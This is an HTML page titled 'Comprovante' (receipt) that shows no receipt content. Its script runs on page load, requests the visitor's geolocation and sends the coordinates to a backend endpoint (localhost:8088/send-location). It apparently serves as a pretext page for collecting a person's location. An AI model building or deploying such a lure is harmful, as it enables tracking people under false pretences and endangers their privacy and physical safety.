<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante</title>
</head>
<body style="background-color: antiquewhite;">
  <h1>Comprovante</h1>

  <script>
    // Executa automaticamente ao carregar a página
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Seu navegador não suporta geolocalização.");
      }
    });

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      console.log("Latitude: " + latitude);
      console.log("Longitude: " + longitude);

      // Envia a localização para o backend
      // Certifique-se de que a URL abaixo está correta
      fetch("http://localhost:8088/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error("Erro na resposta do servidor.");
        }
        return response.json();
      })
      .then(data => {
        if (data.success) {
          alert("Localização enviada com sucesso!");
        } else {
          alert("Falha ao enviar a localização. Tente novamente.");
        }
      })
      .catch(error => {
        console.error("Erro ao enviar a localização:", error);
        alert("Erro inesperado ao enviar a localização. Verifique o console para mais detalhes.");
      });
    }

    function handleError(error) {
      let message = "Erro ao obter a localização.";
      switch (error.code) {
        case error.PERMISSION_DENIED:
          message = "Permissão negada para acessar a localização.";
          break;
        case error.POSITION_UNAVAILABLE:
          message = "Informações de localização indisponíveis.";
          break;
        case error.TIMEOUT:
          message = "O tempo para obter a localização expirou.";
          break;
        default:
          message = "Erro desconhecido ao obter a localização.";
      }
      alert(message);
    }
  </script>
</body>
</html>
